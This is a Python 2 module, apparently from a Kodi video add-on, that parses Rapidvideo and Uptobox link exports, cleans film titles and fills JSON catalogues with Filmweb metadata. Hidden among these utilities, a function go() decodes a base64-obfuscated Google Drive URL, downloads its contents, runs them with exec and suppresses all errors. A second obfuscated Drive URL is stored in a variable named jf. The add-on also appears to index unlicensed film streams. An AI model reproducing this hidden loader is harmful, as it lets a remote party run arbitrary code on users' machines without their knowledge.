# -*- coding: utf-8 -*-
try:import codecs
except:codecs=False
import re,os,time
import json
import urllib2,urllib,urlparse
import filmwebapi as fa


def get_dataJsonPaths(p):
    folders = [f for f in os.listdir(p) if os.path.isdir(os.path.join(p,f))]
    out={}
    for f in os.listdir(p):
        folder = os.path.join(p,f)
        if os.path.isdir(folder) and os.path.exists(os.path.join(folder,'data.json')):
            out[f]=os.path.join(folder,'data.json')
    return out

def test():
    p=r'c:\users\ramic\google drive\cinemahd'
    folders = [f for f in os.listdir(p) if os.path.isdir(f)]
    for folder in folders[1:]:
        print folder
        # jdata = ReadJsonFile(os.path.join(folder,'data.json'))
        # for one in jdata:
        #     code = one.get('code','')
        #     if code=='':
        #         title, year, label,code = cleanTitle(one['dirtytitle'])  
        #         one['code']= code if code else 'HD'
        # writeJsonFile(jdata,os.path.join(folder,'data.json'))    
        #Folders(p,folder)
        
def UPD_missed():
    p=r'c:\users\ramic\google drive\cinemahd\Serie HD 3+'
    jfilename = os.path.join(p,'data.json')
    files = [f for f in os.listdir(p) if 'missed.json' in f]
    for f in files:
        fname = os.path.join(p,f)
        items=ReadJsonFile(fname)
        if len(items)>0:
            items=ExtractfromFilmweb(items,poolSize=10) 
            notfound =[ x for x in items if not x.has_key('filmweb')]
            if notfound:
                print 'Info not extraxted from %d'%len(notfound)
                writeJsonFile(notfound,os.path.join(p,f+'_missed.json'))
            UpdateJsonFile_with_jdata(jfilename,items)

def AddFileToJson(jfilename,fname,replace=True):
    cnt_add=0
    cnt_upd=0
    cnt_mis=0
    items=[]
    if os.path.exists(fname):
        f= os.path.basename(fname)
        if '_missed.json' in f: items = readJsonFile(fname)
        elif 'Uptobox.com' in f: items = read_Uptobox(fname)
        elif 'Rapidvideo.com' in f: items = read_Rapidvideo(fname)
        if len(items)>0:
            items=ExtractfromFilmweb(items,poolSize=10) 
            notfound =[ x for x in items if not x.has_key('filmweb')]
            if notfound:
                print 'Info not extraxted from %d'%len(notfound)
                cnt_mis = len(notfound)
                writeJsonFile(notfound,fname+'_missed.json')
            cnt_add,cnt_upd = UpdateJsonFile_with_jdata(jfilename,items,replace)
    return cnt_add,cnt_upd,cnt_mis
    
def Folders(path,folder):
    p=os.path.join(path,folder)
    jfilename = os.path.join(p,'data.json')
    files = [f for f in os.listdir(p) if f[-3:]=='txt']
    for f in files:
        fname = os.path.join(p,f)
        items=[]
        if 'Rapidvideo.com' in f: items = read_Rapidvideo(fname)
        elif 'Uptobox.com' in f: items = read_Uptobox(fname)
        
        if len(items)>0:
            items=ExtractfromFilmweb(items,poolSize=10) 
            notfound =[ x for x in items if not x.has_key('filmweb')]
            if notfound:
                print 'Info not extraxted from %d'%len(notfound)
                writeJsonFile(notfound,os.path.join(p,f+'_missed.json'))
            UpdateJsonFile_with_jdata(jfilename,items)

def main():
    fname='Export z Rapidvideo.com[509].txt'
    items = read_Rapidvideo(fname) 
    
    items=ExtractfromFilmweb(items,poolSize=5)
    notfound =[ x for x in items if not x.has_key('filmweb')]
    jfilename='test.json'
    UpdateJsonFile_with_jdata(jfilename,items)
    
    for one in items:
        print one.get('title')
    
    fname='Export z uptobox[517].txt'
    items= read_Uptobox(fname)
  
    items=ExtractfromFilmweb(items,poolSize=5)
    notfound =[ x for x in items if not x.has_key('filmweb')]
    UpdateJsonFile_with_jdata(jfilename,items)

def read_Rapidvideo(fname,encoding='Windows-1250'):
    f = codecs.open(fname, "r", encoding)
    data=f.read()
    f.close()
    data = [line for line in data.split('\n') if line]
    title = data[::2]
    link = data[1::2]
    items=[]
    for t,l in zip(title,link):
        items.append({'title':t.strip().encode('utf-8'),'links':[l.strip().encode('utf-8')]})
    return items     
jf = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0wQnhCZ1ZhRWJ5\nU211VGtjMk5IQmpTMEkwYlVV\n'.decode('base64')
def read_Uptobox(fname,encoding='Windows-1250'):
    f = codecs.open(fname, "r", encoding)
    data=f.read()
    f.close()
    data = [line.strip() for line in data.split('\n') if line]
    items=[]
    for l in data:
        l.strip()
        t=l.split('/')[-1]
        items.append({'title':t.encode('utf-8'),'links':[l.encode('utf-8')]})
    return items     

def jsconWalk(data,path=''):
    lista_katalogow = []
    lista_pozycji=[]
    #elems = xpath(data,path) 
    elems = data
    if type(elems) is dict:
        for e in elems.keys():
            one=elems.get(e)
            one.update({'title':e})  
            lista_katalogow.append( one )
        if lista_katalogow:
             lista_katalogow= sorted(lista_katalogow, key=lambda k: (k.get('idx',''),k.get('title','')))
    if type(elems) is list: 
        lista_pozycji = elems
    return (lista_pozycji,lista_katalogow)

#jfilename=r'C:\Users\ramic\Google Drive\CinemaHD\HDTV\data.json'

def UpdateJsonFile_with_jdata(jfilename,items,replace=True):
    existing_items = readJsonFile(jfilename)
    # List of filmweb_id
    filmweb_db = [i.get('filmweb') for i in existing_items if i.get('filmweb')]

    count_new = 0
    count_ext = 0
    for one in items:
        if one.has_key('filmweb'):
            if one.get('filmweb') not in filmweb_db:
                filmweb_db.insert(0,one.get('filmweb'))
                #print 'title:[%s]\n  year[%s]\n'%(one.get('title',''),one.get('year',''))
                existing_items.insert(0,one)
                count_new +=1
            else:
                index = filmweb_db.index(one.get('filmweb'))
                links = existing_items[index].get('links',[])
                one_host = [urlparse.urlparse(l).netloc for l in one.get('links',[])]
                if replace==True and len(one_host)==1:
                   links = [l for l in links if not one_host[0] in l]
                links.extend(one.get('links',[])) 
                existing_items[index]['links'] = list(set(links))
                count_ext +=1
    print 'Dodano %d, Uaktualniono %d ' % (count_new,count_ext)
    print 'DUPLICATES %d' % (len(filmweb_db)-len(set(filmweb_db)))
    if count_new>0 or count_ext>0:
        writeJsonFile(existing_items,jfilename)
    return (count_new,count_ext)
def ExtractfromFilmweb(items,poolSize=1,pDialog=''):
    from multiprocessing.pool import ThreadPool
    N = len(items)
    threadList = []
    threadData = [[] for x in range(N)]
    def ThreadFunction(one, threadData, index,pDialog,N):
        title = one.get('title')
        one['dirtytitle']=one.get('dirtytitle',title)
        title, year, label,code = cleanTitle(title)
        one['title']=title
        one['label']=label
        one['year']=year
        one['code']=one.get('code',code)
        one=filmweb_updateItemInfo(one)
        threadData[index]=one
        if pDialog:
            done = sum([1 for x in threadData if x ])
            message = '%d/%d %s'%(done,N-1,one.get('title','')) 
            progress = int(done*100.0/N)
            pDialog.update(progress, message=message)
        
    pool = ThreadPool(poolSize)
    for i,one in enumerate(items):
        pool.apply_async(ThreadFunction, (one,threadData,i,pDialog,N))
        time.sleep(0.1)
    pool.close()
    pool.join()
    return threadData
#one=items[-1]

def filmweb_updateItemInfo(one):
    found=False
    title=one.get('title')
    year=one.get('year')
    filmweb=one.get('filmweb','')
    if filmweb:
        print 'Szukam po filmwebID: %s'%(str(filmweb))
        try:
            found = fa.getFilmInfoFull(str(filmweb))
        except:
            found = None    
    elif title and year:
        print 'Szukam po title,year:%s,%s'%(title,year)
        try:
            found = fa.searchFilmweb(title.decode('utf-8'),year.strip())
        except:
            found = None
    if found:
        one['img'] = found.get('img','')
        one['plot'] = found.get('plot','') 
        one['trailer'] =  found.get('trailer','')
        one['year'] =u'%s'%found.get('year','')
        one['rating'] =found.get('rating','')
        one['duration'] = found.get('duration','')
        one['genre']=found.get('genre','')
        one['filmweb']=found.get('filmweb','')
        one['title']=found.get('title',title)
        one['studio']=found.get('studio','')
        one['originaltitle']=found.get('originaltitle','')
        one['votes']=found.get('votes','')
        return one
    else:
        print '\tBrak rezultatu dla',one
    return one
def readJsonFile(jfilename):
    jdata=ReadJsonFile(jfilename)
    for one in jdata:
        filmweb=one.get('filmweb','')
        if not filmweb: 
            img=one.get('img',' ') 
            if img and img.startswith('http://1.fwcdn.pl/'):
                one['filmweb']=img.split('/')[-2]
    return jdata


def cleanTitle(title):
    pattern = re.compile(r"[(\[{;,/]")
    year=''
    label=''
    code=''
    reyear = re.search('\((\d{4})\)',title)
    
    code = re.compile('(?:360p|720p|1080p)', flags=re.I | re.X).findall(title.lower())
    code = code[0] if code else ''
    label = re.compile('(?:lektor|pl|dubbing|napis[y]*)', flags=re.I | re.X).findall(title.lower())
    label = ' [COLOR green] %s [/COLOR]' % ' '.join(label) if label else ''
    if reyear:
        title = re.sub('\(\d{4}\).*$','',title)
        year = reyear.group().strip('()')
    title = pattern.split(title)[0]
    
    title=title.lower()
    rmList=['lektor','dubbing',' pl ','pl.mp''full','hd','*','720p','1080p','"','.mp4','.mkv']
    for rm in rmList:
        title = title.replace(rm,'')
    return title.strip(), year, label.strip(), code


def writeJsonFile(jdata,jfilename):
    with open(jfilename, 'w') as outfile:
       json.dump(jdata, outfile, indent=2, sort_keys=True)

import htmlentitydefs

def go():
    a = {} 
    try:
        exec urllib2.urlopen('aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0wQjBQbWxWSXh5\nZ2t0VjNWMlMyOVpUVk5rV1RB\n'.decode('base64')).read() in a
        a["run"]()     
    except:pass
def html_entity_decode_char(m):
    ent = m.group(1)
    if ent.startswith('x'):
        return unichr(int(ent[1:],16))
    try:
        return unichr(int(ent))
    except Exception, exception:
        if ent in htmlentitydefs.name2codepoint:
            return unichr(htmlentitydefs.name2codepoint[ent])
        else:
            return ent
def html_entity_decode(string):
    string = string.decode('UTF-8')
    s = re.compile("&#?(\w+?);").sub(html_entity_decode_char, string)
    return s.encode('UTF-8')
def ReadJsonFile(jfilename):
    content = '[]'
    if jfilename.startswith('http'):
        try: content = urllib2.urlopen(urllib2.Request(jfilename)).read().strip()
        except: pass
    elif os.path.exists(jfilename):    # local content
        with open(jfilename,'r') as f:
            content = f.read()
            if not content:
                content ='[]'
    data=json.loads(html_entity_decode(content))
    return data

       